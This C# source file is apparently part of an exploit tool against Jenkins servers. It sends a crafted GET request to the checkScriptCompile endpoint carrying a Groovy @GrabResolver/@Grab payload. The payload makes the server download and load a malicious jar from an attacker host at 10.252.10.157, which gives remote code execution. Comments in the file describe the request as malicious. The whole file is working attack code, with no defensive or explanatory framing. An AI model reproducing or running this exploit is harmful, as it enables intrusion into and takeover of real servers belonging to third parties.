using System;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace jenkins_server_rce.jenkinsrequests
{
    public class jenkins_requests
    {
        //Function Call: SendPayloadInGETRequest(string url)
        //Function Parameters => Return Type : String => Void
        //Function Purpose: Will send the malicios GET request with the malicious
        //jar file to Jenkins server
        public static string SendPayloadInGETRequest(string url, HttpClient client)
        {
            string payload = $"{url}descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?" +
            	"value=@GrabResolver(name=%27orange.tw%27,%20root=%27http://10.252.10.157%27)%0a" +
            	"@Grab(group=%27ww.orange%27,%20module=%27poc%27,%20version=%271%27)%0aimport%20NixExploit";

            Console.WriteLine(payload);
            Console.WriteLine("Printing result...");

            using (HttpResponseMessage response = client.GetAsync(payload).Result)
            {
                //Console.WriteLine(response);
                using (HttpContent content = response.Content)
                { 
                    string myContent = content.ReadAsStringAsync().Result;
                    //Console.WriteLine(myContent);
                    JenkinsJSONResponse jResponse = JsonConvert.DeserializeObject<JenkinsJSONResponse>(myContent);
                    //Console.WriteLine("JResponse: " + jResponse.status);
                    return jResponse.status;
                }
            }

       

        }
    }

    public class JenkinsJSONResponse
    {
        public int column { get; set; }
        public int line { get; set; }
        public string message { get; set; }
        public string status { get; set; }
    }
}
